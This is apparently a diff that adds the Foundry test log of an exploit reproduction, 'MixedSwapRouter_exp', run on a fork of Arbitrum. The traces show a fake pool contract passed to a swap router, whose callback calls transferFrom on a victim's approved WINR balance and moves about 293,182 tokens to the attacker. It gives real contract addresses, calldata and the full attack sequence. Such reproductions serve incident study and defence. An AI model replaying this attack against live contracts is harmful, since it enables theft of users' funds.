@@ -1,0 +1,86 @@
+No files changed, compilation skipped
+
+Ran 1 test for test/MixedSwapRouter_exp.sol:ContractTest
+[PASS] testExploit() (gas: 3382901)
+Logs:
+  Vicitm WINR balance before exploit: 293182.421809175367609122
+  Attacker WINR balance before exploit: 0.000000000000000000
+  Vicitm WINR balance after exploit: 0.000000000000000000
+  Attacker WINR balance after exploit: 293182.421809175367609122
+
+Traces:
+  [5830] ContractTest::setUp()
+    ├─ [0] VM::createSelectFork("arbitrum", 216881055 [2.168e8])
+    │   └─ ← [Return] 0
+    └─ ← [Stop]
+
+  [3410401] ContractTest::testExploit()
+    ├─ [3359853] → new Exploit@0x5A4A2b5aAc42Fd15C38490106CC41e3984fC6768
+    │   ├─ [1994272] → new Moneys@0x6E0505Df87B1089AD6c2EA6D2b6f565dD07058AD
+    │   │   ├─  storage changes:
+    │   │   │   @ 31: 0 → 0x0000000000000000000000d77b108d4f6cefaa0cae9506a934e825becca46e01
+    │   │   │   @ 33: 0 → 0x000000000000000000000000b6d566c4d645ab640fc6ac362f233dcfb5621f7c
+    │   │   │   @ 34: 0 → 0x000000000000000000000000e3e98241cb99af7a452e94b9cf219aaa766e0869
+    │   │   │   @ 35: 0 → 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496
+    │   │   │   @ 12: 0 → 1
+    │   │   │   @ 32: 0 → 0x0000000000000000000000005a4a2b5aac42fd15c38490106cc41e3984fc6768
+    │   │   └─ ← [Return] 9295 bytes of code
+    │   ├─ [121643] 0xE3E98241CB99AF7a452e94B9cf219aAa766e0869::swapTokensForTokens(ExactInputParams({ path: 0xd77b108d4f6cefaa0cae9506a934e825becca46e000000d77b108d4f6cefaa0cae9506a934e825becca46e, recipient: 0x5A4A2b5aAc42Fd15C38490106CC41e3984fC6768, deadline: 1717145303 [1.717e9], amountIn: 10, amountOutMin: 10, pool: [0x6E0505Df87B1089AD6c2EA6D2b6f565dD07058AD] }))
+    │   │   ├─ [116690] 0x58637AAAC44e2A2F190D9e1976E236d86D691542::swapTokensForTokens(ExactInputParams({ path: 0xd77b108d4f6cefaa0cae9506a934e825becca46e000000d77b108d4f6cefaa0cae9506a934e825becca46e, recipient: 0x5A4A2b5aAc42Fd15C38490106CC41e3984fC6768, deadline: 1717145303 [1.717e9], amountIn: 10, amountOutMin: 10, pool: [0x6E0505Df87B1089AD6c2EA6D2b6f565dD07058AD] })) [delegatecall]
+    │   │   │   ├─ [375] Moneys::fee() [staticcall]
+    │   │   │   │   └─ ← [Return] 0
+    │   │   │   ├─ [590] Moneys::token0() [staticcall]
+    │   │   │   │   └─ ← [Return] 0xD77B108d4f6cefaa0Cae9506A934e825BEccA46E
+    │   │   │   ├─ [588] Moneys::token1() [staticcall]
+    │   │   │   │   └─ ← [Return] 0xD77B108d4f6cefaa0Cae9506A934e825BEccA46E
+    │   │   │   ├─ [98212] Moneys::swap(Exploit: [0x5A4A2b5aAc42Fd15C38490106CC41e3984fC6768], false, 10, 1461446703485210103287273052203988822378723970341 [1.461e48], 0x000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000600000000000000000000000005a4a2b5aac42fd15c38490106cc41e3984fc67680000000000000000000000006e0505df87b1089ad6c2ea6d2b6f565dd07058ad000000000000000000000000000000000000000000000000000000000000002bd77b108d4f6cefaa0cae9506a934e825becca46e000000d77b108d4f6cefaa0cae9506a934e825becca46e000000000000000000000000000000000000000000)
+    │   │   │   │   ├─ [2584] 0xD77B108d4f6cefaa0Cae9506A934e825BEccA46E::balanceOf(0xb6d566c4d645ab640fc6Ac362f233dCFB5621f7C) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 293182421809175367609122 [2.931e23]
+    │   │   │   │   ├─ emit log_named_decimal_uint(key: "Vicitm WINR balance before exploit", val: 293182421809175367609122 [2.931e23], decimals: 18)
+    │   │   │   │   ├─ [2584] 0xD77B108d4f6cefaa0Cae9506A934e825BEccA46E::balanceOf(Moneys: [0x6E0505Df87B1089AD6c2EA6D2b6f565dD07058AD]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 0
+    │   │   │   │   ├─ emit log_named_decimal_uint(key: "Attacker WINR balance before exploit", val: 0, decimals: 18)
+    │   │   │   │   ├─ [42455] 0xE3E98241CB99AF7a452e94B9cf219aAa766e0869::algebraSwapCallback(-20057735863910611438 [-2.005e19], 293182421809175367609122 [2.931e23], 0x00000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000060000000000000000000000000b6d566c4d645ab640fc6ac362f233dcfb5621f7c0000000000000000000000006e0505df87b1089ad6c2ea6d2b6f565dd07058ad000000000000000000000000000000000000000000000000000000000000002bd77b108d4f6cefaa0cae9506a934e825becca46e000000d77b108d4f6cefaa0cae9506a934e825becca46e000000000000000000000000000000000000000000)
+    │   │   │   │   │   ├─ [42008] 0x58637AAAC44e2A2F190D9e1976E236d86D691542::algebraSwapCallback(-20057735863910611438 [-2.005e19], 293182421809175367609122 [2.931e23], 0x00000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000060000000000000000000000000b6d566c4d645ab640fc6ac362f233dcfb5621f7c0000000000000000000000006e0505df87b1089ad6c2ea6d2b6f565dd07058ad000000000000000000000000000000000000000000000000000000000000002bd77b108d4f6cefaa0cae9506a934e825becca46e000000d77b108d4f6cefaa0cae9506a934e825becca46e000000000000000000000000000000000000000000) [delegatecall]
+    │   │   │   │   │   │   ├─ [590] Moneys::token0() [staticcall]
+    │   │   │   │   │   │   │   └─ ← [Return] 0xD77B108d4f6cefaa0Cae9506A934e825BEccA46E
+    │   │   │   │   │   │   ├─ [588] Moneys::token1() [staticcall]
+    │   │   │   │   │   │   │   └─ ← [Return] 0xD77B108d4f6cefaa0Cae9506A934e825BEccA46E
+    │   │   │   │   │   │   ├─ [33142] 0xD77B108d4f6cefaa0Cae9506A934e825BEccA46E::transferFrom(0xb6d566c4d645ab640fc6Ac362f233dCFB5621f7C, Moneys: [0x6E0505Df87B1089AD6c2EA6D2b6f565dD07058AD], 293182421809175367609122 [2.931e23])
+    │   │   │   │   │   │   │   ├─ emit Approval(owner: 0xb6d566c4d645ab640fc6Ac362f233dCFB5621f7C, spender: 0xE3E98241CB99AF7a452e94B9cf219aAa766e0869, value: 706817578190824632390878 [7.068e23])
+    │   │   │   │   │   │   │   ├─ emit Transfer(from: 0xb6d566c4d645ab640fc6Ac362f233dCFB5621f7C, to: Moneys: [0x6E0505Df87B1089AD6c2EA6D2b6f565dD07058AD], value: 293182421809175367609122 [2.931e23])
+    │   │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   │   @ 0x3008c1e80119bc9bd0a4f13c14c2c3c4b8900c0a23792553561bf6899e616802: 0x000000000000000000000000000000000000000000003e15737058669b016b22 → 0
+    │   │   │   │   │   │   │   │   @ 0x42a478a8737a5002f4c167a98348c5b04a38e92ded662beea55b61022be17a17: 0 → 0x000000000000000000000000000000000000000000003e15737058669b016b22
+    │   │   │   │   │   │   │   │   @ 0x935c5e2bc3454e2c7906e43850f72136c5db3b086252e52824d0bb3e6928d63e: 0x00000000000000000000000000000000000000000000d3c21bcecceda1000000 → 0x0000000000000000000000000000000000000000000095aca85e748705fe94de
+    │   │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   │   └─ ← [Return]
+    │   │   │   │   ├─ [584] 0xD77B108d4f6cefaa0Cae9506A934e825BEccA46E::balanceOf(0xb6d566c4d645ab640fc6Ac362f233dCFB5621f7C) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 0
+    │   │   │   │   ├─ emit log_named_decimal_uint(key: "Vicitm WINR balance after exploit", val: 0, decimals: 18)
+    │   │   │   │   ├─ [584] 0xD77B108d4f6cefaa0Cae9506A934e825BEccA46E::balanceOf(Moneys: [0x6E0505Df87B1089AD6c2EA6D2b6f565dD07058AD]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 293182421809175367609122 [2.931e23]
+    │   │   │   │   ├─ emit log_named_decimal_uint(key: "Attacker WINR balance after exploit", val: 293182421809175367609122 [2.931e23], decimals: 18)
+    │   │   │   │   ├─ [584] 0xD77B108d4f6cefaa0Cae9506A934e825BEccA46E::balanceOf(Moneys: [0x6E0505Df87B1089AD6c2EA6D2b6f565dD07058AD]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 293182421809175367609122 [2.931e23]
+    │   │   │   │   ├─ [24942] 0xD77B108d4f6cefaa0Cae9506A934e825BEccA46E::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 293182421809175367609122 [2.931e23])
+    │   │   │   │   │   ├─ emit Transfer(from: Moneys: [0x6E0505Df87B1089AD6c2EA6D2b6f565dD07058AD], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 293182421809175367609122 [2.931e23])
+    │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   @ 0x5ff10565516c110180bb9cc111cdbc2b0a68e09ff7fac17290373c3aa4a1bb03: 0 → 0x000000000000000000000000000000000000000000003e15737058669b016b22
+    │   │   │   │   │   │   @ 0x42a478a8737a5002f4c167a98348c5b04a38e92ded662beea55b61022be17a17: 0x000000000000000000000000000000000000000000003e15737058669b016b22 → 0
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   └─ ← [Return] 10, 10
+    │   │   │   └─ ← [Stop]
+    │   │   └─ ← [Return]
+    │   ├─  storage changes:
+    │   │   @ 12: 0 → 1
+    │   │   @ 33: 0 → 0x000000000000000000000000e3e98241cb99af7a452e94b9cf219aaa766e0869
+    │   │   @ 31: 0 → 0x0000000000000000000000d77b108d4f6cefaa0cae9506a934e825becca46e01
+    │   │   @ 32: 0 → 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496
+    │   └─ ← [Return] 5533 bytes of code
+    └─ ← [Stop]
+
+Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 4.45s (3.15s CPU time)
+
+Ran 1 test suite in 6.56s (4.45s CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
